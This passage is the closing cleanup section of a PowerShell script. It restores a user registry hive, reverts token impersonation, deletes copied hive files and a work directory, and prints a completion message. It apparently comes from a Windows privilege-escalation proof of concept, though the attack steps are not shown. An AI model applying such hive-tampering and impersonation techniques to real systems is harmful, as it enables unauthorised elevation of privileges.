        [NativeMethods]::WriteFile($hUserHiveRestore, $hiveBuffer, [uint32]$hiveBuffer.Length, [ref]$bytesWritten, [IntPtr]::Zero)
        [NativeMethods]::CloseHandle($hUserHiveRestore)
    }
}

# Revert impersonation
[NativeMethods]::RevertToSelf()

# Delete files
if (Test-Path $usrClassHivePathNew) {
    [NativeMethods]::DeleteFile($usrClassHivePathNew)
}

if (Test-Path $newHivePath) {
    [NativeMethods]::DeleteFile($newHivePath)
}

# Close token
if ($htoken -ne [IntPtr]::Zero) {
    [NativeMethods]::CloseHandle($htoken)
}

# Remove directory
if (Test-Path $workdir) {
    [NativeMethods]::RemoveDirectory($workdir)
}

Write-Host "[*] Cleanup complete"

exit 0
